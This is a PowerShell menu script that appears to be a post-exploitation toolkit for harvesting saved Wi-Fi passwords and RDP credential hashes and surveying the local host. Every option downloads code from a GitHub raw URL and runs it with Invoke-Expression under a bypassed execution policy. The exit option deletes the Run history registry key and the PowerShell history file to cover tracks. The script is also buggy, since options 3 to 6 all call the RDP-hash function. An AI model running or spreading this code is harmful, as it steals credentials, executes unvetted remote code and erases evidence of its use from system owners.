# Menu function to display options and get user input
function Show-Menu {
    Clear-Host
    Write-Host " -------------------------------------------------- "
    Write-Host "|                    SCRIPT MENU                   |"
    Write-Host " -------------------------------------------------- "
    Write-Host "0. Exit"
    Write-Host "1. List saved WLAN passwords"
    Write-Host "2. List RDP saved hash"
    Write-Host "3. List open ports on localhost"
    Write-Host "4. List shared folders on localhost"
    Write-Host "5. List programs installed on localhost"
    Write-Host "6. List processes running on localhost"

    Write-Host
    $choice = Read-Host "Enter your choice"

    # Process user input
    switch ($choice) {
        "0" { Run-Script0 }
        "1" { Run-Script1; Press-AnyKey; Show-Menu }  # Added Press-AnyKey and Show-Menu here
        "2" { Run-Script2; Press-AnyKey; Show-Menu }  # Added the case for option 2
        "3" { Run-Script2; Press-AnyKey; Show-Menu }  # Added the case for option 3
        "4" { Run-Script2; Press-AnyKey; Show-Menu }  # Added the case for option 4
        "5" { Run-Script2; Press-AnyKey; Show-Menu }  # Added the case for option 5
        "6" { Run-Script2; Press-AnyKey; Show-Menu }  # Added the case for option 6

        default {
            Write-Host "Invalid choice. Please try again."
            Show-Menu
        }
    }
}

# Define individual script functions
function Run-Script0 {
    Write-Host "Clearing execution history..."
    Set-Location HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\
    Remove-Item .\RunMRU\

    Write-Host "Clearing PowerShell history..."
    Remove-Item (Get-PSReadlineOption).HistorySavePath

    Write-Host "Goodbye"
    exit
}

function Run-Script1 {
    powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/WLAN-PSW-Finder.ps1').Content);pause"
}

function Run-Script2 {
    # Start the "RetrieveRDPSavedHash.ps1" script
    powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/RetrieveRDPSavedHash.ps1').Content);pause"
}
function Run-Script3 {
    # Start the "Port-Discovery.ps1" script
    powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/Port-Discovery.ps1').Content);pause"
}

function Run-Script4 {
    # Start the "SharedFolder.ps1" script
    powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/SharedFolder.ps1').Content);pause"
}

function Run-Script5 {
    # Start the "SharedFolder.ps1" script
    powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/ProgramLister.ps1').Content);pause"
}

function Run-Script6 {
    # Start the "SharedFolder.ps1" script
    powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/Processes.ps1').Content);pause"
}

# Helper function to prompt user to press any key
function Press-AnyKey {
    Write-Host
    Write-Host "Press Enter to continue..."
    $key = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyUp")
    if ($key.KeyChar -eq "`r") {
        Press-AnyKey
    }
}

# Start the script by showing the menu
Show-Menu
